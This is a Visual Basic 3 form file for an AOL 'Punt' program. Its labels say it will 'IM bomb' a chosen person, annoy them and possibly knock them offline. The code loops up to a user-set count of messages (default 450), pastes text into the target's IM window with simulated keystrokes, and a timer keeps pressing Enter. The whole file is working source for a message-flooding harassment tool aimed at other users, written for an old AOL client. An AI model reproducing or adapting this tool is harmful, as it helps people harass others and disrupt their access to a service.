VERSION 2.00
Begin Form Form11 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   3  'Fixed Double
   Caption         =   "Punt"
   ClientHeight    =   4170
   ClientLeft      =   2700
   ClientTop       =   1470
   ClientWidth     =   4200
   ControlBox      =   0   'False
   Height          =   4575
   Icon            =   FORM11.FRX:0000
   Left            =   2640
   LinkTopic       =   "Form11"
   MaxButton       =   0   'False
   ScaleHeight     =   4170
   ScaleWidth      =   4200
   Top             =   1125
   Width           =   4320
   Begin Timer Timer1 
      Interval        =   200
      Left            =   600
      Top             =   240
   End
   Begin SSCommand Command3D3 
      BevelWidth      =   3
      Caption         =   "&Help"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   375
      HelpContextID   =   12
      Left            =   1680
      TabIndex        =   12
      Top             =   3720
      Width           =   855
   End
   Begin TextBox Text2 
      Height          =   285
      Left            =   3360
      TabIndex        =   1
      Text            =   "450"
      Top             =   1800
      Width           =   615
   End
   Begin SSCommand Command3D2 
      BevelWidth      =   3
      Caption         =   "&Cancel"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   2880
      TabIndex        =   10
      Top             =   3720
      Width           =   975
   End
   Begin SSCommand Command3D1 
      BevelWidth      =   3
      Caption         =   "&Start"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   360
      TabIndex        =   9
      Top             =   3720
      Width           =   975
   End
   Begin TextBox Text1 
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   1335
      Left            =   240
      MaxLength       =   260
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   2280
      Width           =   3735
   End
   Begin Label Label1 
      AutoSize        =   -1  'True
      BackColor       =   &H8000000F&
      Caption         =   "# of IMs to send:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   195
      Left            =   1920
      TabIndex        =   11
      Top             =   1800
      Width           =   1275
   End
   Begin Label Label8 
      BackColor       =   &H00C0C0C0&
      Caption         =   "What to send:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   -1  'True
      Height          =   255
      Left            =   120
      TabIndex        =   8
      Top             =   1920
      Width           =   1215
   End
   Begin Label Label7 
      BackColor       =   &H00C0C0C0&
      Caption         =   "will have a hard time even turing off their IMs."
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   7
      Top             =   1440
      Width           =   3735
   End
   Begin Label Label6 
      BackColor       =   &H00C0C0C0&
      Caption         =   "of them, if not punt them.  It goes so fast they"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   6
      Top             =   1200
      Width           =   3615
   End
   Begin Label Label5 
      BackColor       =   &H00C0C0C0&
      Caption         =   "bomb the person, and will annoy the hell out "
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   5
      Top             =   960
      Width           =   3615
   End
   Begin Label Label4 
      BackColor       =   &H00C0C0C0&
      Caption         =   "want to IM bomb.  This is will VERY quickly"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   4
      Top             =   720
      Width           =   3495
   End
   Begin Label Label3 
      BackColor       =   &H00C0C0C0&
      Caption         =   "IM window already open from the person you"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   480
      Width           =   3615
   End
   Begin Label Label2 
      BackColor       =   &H00C0C0C0&
      Caption         =   " You will need an"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   1200
      TabIndex        =   2
      Top             =   240
      Width           =   1455
   End
End
Declare Function SetWindowPos Lib "User" (ByVal h%, ByVal hb%, ByVal x%, ByVal Y%, ByVal cx%, ByVal cy%, ByVal f%) As Integer


Const SWP_NOMOVE = 2
Const SWP_NOSIZE = 1
Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2

Sub Command3D1_Click ()
If SignStatus = 0 Then
MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
Exit Sub
End If
If text1.Text = "" Then GoTo shit

Exe:

clipboard.SetText text1.Text
'SendKeys "%{TAB}"
form11.Hide
punt2stat.Show
AppActivate "America  Online"
Count1 = 0
For Rep = 1 To text2.Text
If thiswin1% <> 0 Then
SendKeys "{ENTER}"
DoEvents
End If
If quit6 = 1000 Then GoTo endall
Count1 = Count1 + 1
If Count1 = 20 Then
DoEvents
Count1 = 0
End If
SendKeys Chr$(22) + "{TAB} "
DoEvents
thiswin1% = FindWindow(0, "America Online")
Next Rep

GoTo endall


shit:
MsgBox "Please enter what you wish to bomb.", 64

endall:
Unload punt2stat
quit6 = 0
form11.Show

End Sub

Sub Command3D2_Click ()
Unload Me

End Sub

Sub Command3D3_Click ()
SendKeys "{F1}"
DoEvents

End Sub

Sub Form_Load ()
Dim Success As Integer

Success% = SetWindowPos%(form11.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)

End Sub

Sub Form_Resize ()
Dim Success As Integer

Success% = SetWindowPos%(form11.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)

End Sub

Sub Timer1_Timer ()
   thiswin1% = FindWindow(0, "America Online")
  If thiswin1% <> 0 Then
  SendKeys "{ENTER}"
  End If

End Sub

